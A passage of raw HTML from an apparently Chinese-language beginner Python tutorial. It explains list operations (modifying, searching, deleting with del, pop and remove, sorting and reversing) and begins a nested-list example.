class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>a<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"乐乐乐乐\"</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">for</span> cxz <span class=\"token keyword\">in</span> z<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>cxz<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"----------更改之后-------------\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>啦啦啦</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>乐乐乐乐</pre></td></tr><tr><td data-num=\"53\"></td><td><pre>呵呵呵</pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span>更改之后<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">3</span><span class=\"token operator\">></span>查找元素<span class=\"token punctuation\">(</span><span class=\"token string\">\"查\"</span><span class=\"token keyword\">in</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span><span class=\"token punctuation\">,</span> index<span class=\"token punctuation\">,</span> count<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>所谓的查找，就是看看指定的元素是否存在</pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token keyword\">in</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>python中查找的常用方法为：</pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    <span class=\"token keyword\">in</span>（存在）<span class=\"token punctuation\">,</span>如果存在那么结果为true，否则为false</pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span>（不存在），如果不存在那么结果为true，否则false</pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"小明\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小红\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"小黑\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>pyname <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"请输入要查找的姓名\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre></pre></td></tr><tr><td data-num=\"72\"></td><td><pre><span class=\"token keyword\">if</span> pyname <span class=\"token keyword\">in</span> name<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'有这个人'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"查无此人\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>index 和 count</pre></td></tr><tr><td data-num=\"79\"></td><td><pre>ndex和count与字符串中的用法相同</pre></td></tr><tr><td data-num=\"80\"></td><td><pre>i <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"d\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"e\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>name<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>  File <span class=\"token string\">\"D:/python基础/基础/dome.py\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    name<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>ValueError<span class=\"token punctuation\">:</span> <span class=\"token string\">'z'</span> <span class=\"token keyword\">is</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> <span class=\"token builtin\">list</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre></pre></td></tr><tr><td data-num=\"88\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">4</span><span class=\"token operator\">></span>删除元素<span class=\"token punctuation\">(</span><span class=\"token string\">\"删\"</span><span class=\"token keyword\">del</span><span class=\"token punctuation\">,</span> pop<span class=\"token punctuation\">,</span> remove<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>类比现实生活中，如果某位同学调班了，那么就应该把这个条走后的学生的姓名删</pre></td></tr><tr><td data-num=\"92\"></td><td><pre>除掉；在开发中经常会用到删除这种功能。</pre></td></tr><tr><td data-num=\"93\"></td><td><pre></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>列表元素的常用删除方法有：</pre></td></tr><tr><td data-num=\"95\"></td><td><pre></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token keyword\">del</span>：根据下标进行删除</pre></td></tr><tr><td data-num=\"97\"></td><td><pre>    pop：删除最后一个元素</pre></td></tr><tr><td data-num=\"98\"></td><td><pre>    remove：根据元素的值进行删除</pre></td></tr><tr><td data-num=\"99\"></td><td><pre></pre></td></tr><tr><td data-num=\"100\"></td><td><pre>demo<span class=\"token punctuation\">:</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">del</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"101\"></td><td><pre></pre></td></tr><tr><td data-num=\"102\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"零零\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"二二\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"三三\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"四四\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"五五\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"六六\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"103\"></td><td><pre></pre></td></tr><tr><td data-num=\"104\"></td><td><pre><span class=\"token keyword\">for</span> zxcv <span class=\"token keyword\">in</span> name<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"105\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxcv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"106\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"删除之前\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"107\"></td><td><pre>零零</pre></td></tr><tr><td data-num=\"108\"></td><td><pre>二二</pre></td></tr><tr><td data-num=\"109\"></td><td><pre>三三</pre></td></tr><tr><td data-num=\"110\"></td><td><pre>四四</pre></td></tr><tr><td data-num=\"111\"></td><td><pre>五五</pre></td></tr><tr><td data-num=\"112\"></td><td><pre>六六</pre></td></tr><tr><td data-num=\"113\"></td><td><pre>删除之前</pre></td></tr><tr><td data-num=\"114\"></td><td><pre><span class=\"token keyword\">del</span> name<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"115\"></td><td><pre><span class=\"token keyword\">for</span> zxcv <span class=\"token keyword\">in</span> name<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"116\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxcv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'删除之后'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre>二二</pre></td></tr><tr><td data-num=\"119\"></td><td><pre>三三</pre></td></tr><tr><td data-num=\"120\"></td><td><pre>四四</pre></td></tr><tr><td data-num=\"121\"></td><td><pre>五五</pre></td></tr><tr><td data-num=\"122\"></td><td><pre>六六</pre></td></tr><tr><td data-num=\"123\"></td><td><pre>删除之后</pre></td></tr><tr><td data-num=\"124\"></td><td><pre></pre></td></tr><tr><td data-num=\"125\"></td><td><pre></pre></td></tr><tr><td data-num=\"126\"></td><td><pre>demo<span class=\"token punctuation\">(</span>pop<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"零零\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"二二\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"三三\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"四四\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"五五\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"六六\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre></pre></td></tr><tr><td data-num=\"129\"></td><td><pre><span class=\"token keyword\">for</span> zxcv <span class=\"token keyword\">in</span> name<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxcv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"删除之前\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre></pre></td></tr><tr><td data-num=\"133\"></td><td><pre>name<span class=\"token punctuation\">.</span>pop<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre><span class=\"token keyword\">for</span> zxcv <span class=\"token keyword\">in</span> name<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxcv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'删除之后'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>零零</pre></td></tr><tr><td data-num=\"138\"></td><td><pre>二二</pre></td></tr><tr><td data-num=\"139\"></td><td><pre>三三</pre></td></tr><tr><td data-num=\"140\"></td><td><pre>四四</pre></td></tr><tr><td data-num=\"141\"></td><td><pre>五五</pre></td></tr><tr><td data-num=\"142\"></td><td><pre>六六</pre></td></tr><tr><td data-num=\"143\"></td><td><pre>删除之前</pre></td></tr><tr><td data-num=\"144\"></td><td><pre>零零</pre></td></tr><tr><td data-num=\"145\"></td><td><pre>二二</pre></td></tr><tr><td data-num=\"146\"></td><td><pre>三三</pre></td></tr><tr><td data-num=\"147\"></td><td><pre>四四</pre></td></tr><tr><td data-num=\"148\"></td><td><pre>五五</pre></td></tr><tr><td data-num=\"149\"></td><td><pre>删除之后</pre></td></tr><tr><td data-num=\"150\"></td><td><pre></pre></td></tr><tr><td data-num=\"151\"></td><td><pre></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>demo<span class=\"token punctuation\">(</span>remove<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"零零\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"二二\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"三三\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"四四\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"五五\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"六六\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre></pre></td></tr><tr><td data-num=\"155\"></td><td><pre><span class=\"token keyword\">for</span> zxcv <span class=\"token keyword\">in</span> name<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxcv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"删除之前\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>name<span class=\"token punctuation\">.</span>remove<span class=\"token punctuation\">(</span><span class=\"token string\">\"四四\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre><span class=\"token keyword\">for</span> zxcv <span class=\"token keyword\">in</span> name<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>zxcv<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'删除之后'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>零零</pre></td></tr><tr><td data-num=\"165\"></td><td><pre>二二</pre></td></tr><tr><td data-num=\"166\"></td><td><pre>三三</pre></td></tr><tr><td data-num=\"167\"></td><td><pre>四四</pre></td></tr><tr><td data-num=\"168\"></td><td><pre>五五</pre></td></tr><tr><td data-num=\"169\"></td><td><pre>六六</pre></td></tr><tr><td data-num=\"170\"></td><td><pre>删除之前</pre></td></tr><tr><td data-num=\"171\"></td><td><pre>零零</pre></td></tr><tr><td data-num=\"172\"></td><td><pre>二二</pre></td></tr><tr><td data-num=\"173\"></td><td><pre>三三</pre></td></tr><tr><td data-num=\"174\"></td><td><pre>五五</pre></td></tr><tr><td data-num=\"175\"></td><td><pre>六六</pre></td></tr><tr><td data-num=\"176\"></td><td><pre>删除之后</pre></td></tr><tr><td data-num=\"177\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre></pre></td></tr><tr><td data-num=\"179\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token number\">5</span><span class=\"token operator\">></span>排序<span class=\"token punctuation\">(</span>sort<span class=\"token punctuation\">,</span> reverse<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>sort方法是将<span class=\"token builtin\">list</span>按特定顺序重新排列，默认为由小到大，参数reverse<span class=\"token operator\">=</span><span class=\"token boolean\">True</span>可改为倒序，由大到小。</pre></td></tr><tr><td data-num=\"181\"></td><td><pre>reverse方法是将<span class=\"token builtin\">list</span>逆置。</pre></td></tr><tr><td data-num=\"182\"></td><td><pre></pre></td></tr><tr><td data-num=\"183\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a</pre></td></tr><tr><td data-num=\"185\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"186\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a<span class=\"token punctuation\">.</span>reverse<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a</pre></td></tr><tr><td data-num=\"188\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a<span class=\"token punctuation\">.</span>sort<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a</pre></td></tr><tr><td data-num=\"191\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"192\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a<span class=\"token punctuation\">.</span>sort<span class=\"token punctuation\">(</span>reverse<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> a</pre></td></tr><tr><td data-num=\"194\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h4 id=\"列表嵌套\"><a class=\"markdownIt-Anchor\" href=\"#列表嵌套\">#</a> <span class=\"label success\">列表嵌套</span></h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>类似<span class=\"token keyword\">while</span>循环的嵌套，列表也是支持嵌套的</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>一个列表中的元素又是一个列表，那么这就是列表的嵌套</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\">#encoding=utf-8</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> random</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># 定义一个列表用来保存 3 个办公室</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>offices <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># 定义一个列表用来存储 8 位老师的名字</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>names <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'A'</span><span class=\"token 